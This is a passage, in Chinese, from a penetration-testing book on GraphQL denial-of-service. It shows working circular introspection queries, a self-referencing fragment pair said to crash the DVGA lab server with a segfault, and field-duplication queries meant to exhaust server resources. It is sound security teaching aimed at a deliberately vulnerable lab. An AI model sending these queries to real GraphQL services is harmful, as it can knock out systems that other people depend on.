

正如名称所示，safe-circular-query.graphql 是循环查询的安全版本。在此查询中，我们请求应用程序中所有粘贴内容的拥有者姓名，只是我们以循环的方式进行，这会指数级增加 GraphQL 服务器需要加载的对象数量。将查询粘贴到 Altair 中并在服务器上运行，以证明循环查询的概念。

> 注意 如果你感觉大胆并且好奇更复杂的循环查询会对我们的脆弱目标产生什么影响，你可以在 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql 找到该查询的不安全版本。此查询可能会导致 DVGA 实例崩溃，甚至可能导致 hypervisor 崩溃，因此请谨慎使用。

## 循环内省漏洞

GraphQL 内置的内省系统存在循环关系。因此，当启用内省时，你可能可以直接获得循环查询。

内省系统有自己的模式，定义在官方 GraphQL 规范文档中。以下是其摘录：

```
type __Schema {
  --snip--
  types: ① [__Type!]!
  queryType: __Type!
  mutationType: __Type
  subscriptionType: __Type
  directives: [__Directive!]!
  --snip--
}
```

```
type ② __Type {
  --snip--
  name: String
  description: String
  fields(includeDeprecated: Boolean = false): ③ [__Field!]
  --snip--
}
```

```
type ④ __Field {
  --snip--
  name: String!
  description: String
  args: [__InputValue!]!
  type: ⑤ __Type!
  isDeprecated: Boolean!
  --snip--
}
```

在 ① 处，`types` 字段为 `__Schema` 对象类型定义。你可以看到 `types` 被设置为 `[__Type!]`，这意味着它使用在 ② 处定义的 `__Type` 对象。方括号和感叹号意味着 `types` 字段将返回一个不可为空的 `__Type` 对象数组。

`__Type` 对象有一个在 ③ 处设置的 `fields` 字段，类型为 `[__Field!]`。这将返回一个包含 `__Field` 对象的不可为空数组。在 ④ 处，`__Field` 类型被定义。此类型有一个名为 `type` 的字段，在 ⑤ 处引用 `__Type` 对象。正如你所见，`__Type.fields` 与 `__Field.type` 之间存在循环关系。

> 注意
> 完整的内省系统模式可以在 GraphQL 规范文档中的 https://spec.graphql.org/October2021/#sec-Schema-Introspection.Schema-Introspection-Schema 找到。

你可以通过使用 Altair 运行以下查询轻松测试这种循环关系：

```
query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              fields {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

此类循环查询可以相当容易地被利用。虽然单个查询可能无法使服务器瘫痪，但一系列复杂查询可能会对其产生影响。

## 循环片段漏洞

GraphQL 操作可以通过使用片段来共享逻辑，如第 3 章所述。片段由客户端定义，因此客户端可以将其中的任何逻辑构建到其中。也就是说，GraphQL 规范文档包含有关片段应如何实现的规则，包括以下一条：

> 片段展开的图必须不形成任何循环，包括自身展开。否则，操作可能会无限展开或在底层数据的循环上无限执行。

让我们探索片段如何构建成循环并导致 DoS。在 DVGA 中运行以下查询，该查询在对象 PasteObject 上使用名为 Start 的片段。`pastes` 字段使用 `...Start` 语法利用此片段：

```
query {
  pastes {
    ...Start
  }
}

fragment Start on PasteObject {
  title
  content
}
```

执行查询时，它会返回 `pastes` 的字段和内容字段：

```
"pastes": [
  {
    "title": "My Title",
    "content": "My First Paste"
  }
]
```

现在，如果我们添加另一个名为 End 的片段，该片段使用 Start 片段，并修改 Start 片段以使用 End 片段，会发生什么？这里会出现一个有趣的情况：

```
query CircularFragment {
  pastes {
    ...Start
  }
}

fragment Start on PasteObject {
  title
  content
  ...End
}

fragment End on PasteObject {
  ...Start
}
```

此条件会导致无限执行，正如 GraphQL 规范所建议的那样。在实验室中尝试使用此查询进行实验。

注意 执行此查询将立即导致 DVGA 因段错误而崩溃。请确保仅在虚拟实验室中执行它。运行查询后，DVGA 将不再可用。要重新启动它，只需按照第 2 章的步骤创建另一个 Docker 容器即可。

如果你运行了查询，你应该会看到几乎立即崩溃！你可能会想，所有 GraphQL 服务器都容易受到此攻击吗？简短的答案是否定的，如果 GraphQL 服务器符合规范。GraphQL 服务器应该在执行前拒绝此类查询。尽管如此，你永远不知道在渗透测试中可能会遇到完全定制的实现，因此了解此技术是值得的。

## 字段重复

字段重复漏洞涉及包含重复字段的查询。它们执行起来很简单，但效果不如循环查询。

虽然循环查询是小型查询，但会导致异常大的响应，而字段重复是大型查询，会因为处理和解析所需的时间而耗尽服务器。为了有效地通过字段重复滥用 GraphQL API，你必须发送持续的查询流，以使服务器资源持续忙碌。

## 理解字段重复的工作原理

要了解字段重复的工作原理，请考虑以下 GraphQL 查询：

```
query {
  pastes {
    title
    content
  }
}
```

此查询返回应用程序中所有粘贴的 `title` 和 `content` 字段。当 GraphQL 收到此查询时，它将使用其查询解析器提供每个请求的字段。

如果我们在查询中“填充”额外的字段，GraphQL 将被迫分别解析每个字段。这种行为可能会给服务器带来额外负载，导致性能下降，甚至完全崩溃。

这里的策略相当简单：选择一个你认为解析可能很昂贵的字段，并用该字段名称的额外副本填充查询。清单 5-5 显示了一个示例查询。

```
query {
  pastes {
    title
    content
    content
    content
    content
    content
  }
}
```

清单 5-5：包含重复字段的 GraphQL 查询

当查询包含多个重复字段时，例如清单 5-5 中 `content` 重复五次，你可能会期望在响应中看到相同的五个字段。实际上，GraphQL 将合并响应并仅显示单个 `content` JSON 字段：

```
{
  "data": {
    "pastes": [
      {
        "title": "My Title",
        "content": "My First Paste"
      }
    ]
  }
}
```

从客户端角度来看，似乎 GraphQL 忽略了我们的重复字段。幸运的是，情况并非如此。通过响应时间分析，你可以看到查询对服务器的影响。除非服务器已实施特定的安全防御，例如查询成本分析（本章后面会介绍），否则你应该期望在大多数 GraphQL 实现中看到这些漏洞。

## 测试字段重复漏洞

为了在我们的实验室中测试字段重复攻击，我们将编写一个简单的查询并尝试重复几个选定的字段，看看我们的目标如何响应。

打开 Altair 并确保地址栏设置为 http://localhost:5013/graphql。在左侧窗格中输入以下查询，它将作为基线：

```
query {
  pastes {
    content
  }
}
```

点击发送以查询 GraphQL。在响应部分，你会注意到 Altair 提供了服务器响应的总时间，单位为毫秒，如图 5-3 所示。

DVGA 响应查询花费了 26 毫秒，这是一个正常的响应时间。你在实验室中看到的时间可能会有所不同，但应该在同一范围内。

